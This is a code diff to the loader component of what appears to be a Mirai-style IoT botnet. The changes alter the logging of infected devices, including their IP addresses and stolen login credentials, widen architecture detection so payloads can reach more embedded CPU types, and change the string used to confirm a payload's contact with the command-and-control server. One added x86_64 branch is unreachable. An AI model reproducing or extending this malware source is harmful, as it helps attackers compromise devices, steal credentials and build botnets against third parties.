@@ -60,20 +60,15 @@ void connection_close(struct connection *conn)
 
         if(conn->srv == NULL)
         {
+            //printf("srv == NULL\n");
             return;
         }
 
         if(conn->success)
         {
             ATOMIC_INC(&conn->srv->total_successes);
-			fprintf(stderr, "\e[1:37m[\e[0:32mINFECTAT\e[1:37m]  \e[0:32m %d.%d.%d.%d:%d %s:%s %s\r\n",
-                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
-                ntohs(conn->info.port),
-                conn->info.user, conn->info.pass, conn->info.arch);
-        }
-        else
-        {
-			ATOMIC_INC(&conn->srv->total_failures);
+            fprintf(stderr, "\e[97m[\e[91mHito\e[97m] \e[31mcoming kawaii person >:3! >> \e[97m%d.%d.%d.%d \e[31m>> \e[97m%s:%s (\e[91m%s\e[97m)\n\033[0m\r",
+                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff, conn->info.user, conn->info.pass, conn->info.arch);
         }
     }
 
@@ -248,6 +243,7 @@ int connection_consume_verify_login(struct connection *conn)
         return prompt_ending;
 }
 
+
 int connection_consume_copy_op(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
@@ -298,6 +294,8 @@ int connection_consume_arch(struct connection *conn)
             }
             else if(ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
                 strcpy(conn->info.arch, "x86");
+            else if (ehdr->e_machine == EM_X86_64)
+                strcpy(conn->info.arch, "x86_64");
             else if(ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
                 strcpy(conn->info.arch, "spc");
             else if(ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
@@ -310,6 +308,16 @@ int connection_consume_arch(struct connection *conn)
                 strcpy(conn->info.arch, "rce");
             else if(ehdr->e_machine == EM_ARC)
                 strcpy(conn->info.arch, "arc");
+            else if(ehdr->e_machine == EM_MICROBLAZE)
+                strcpy(conn->info.arch, "microblazeel");
+            else if(ehdr->e_machine == EM_OPENRISC)
+                strcpy(conn->info.arch, "or1k");
+            else if(ehdr->e_machine == EM_ALTERA_NIOS2)
+                strcpy(conn->info.arch, "nios2");
+            else if(ehdr->e_machine == EM_BLACKFIN)
+                strcpy(conn->info.arch, "bfin");
+            else if(ehdr->e_machine == EM_AARCH64)
+                strcpy(conn->info.arch, "aarch64");
             else
             {
                 conn->info.arch[0] = 0;
@@ -459,7 +467,7 @@ int connection_verify_payload(struct connection *conn)
     if(offset == -1)
         return 0;
     
-    if(util_memsearch(conn->rdbuf, offset, "Connected To CNC", 16) == -1)
+    if(util_memsearch(conn->rdbuf, offset, "im magician", 16) == -1)
         return offset;
     else
         return 255 + offset;
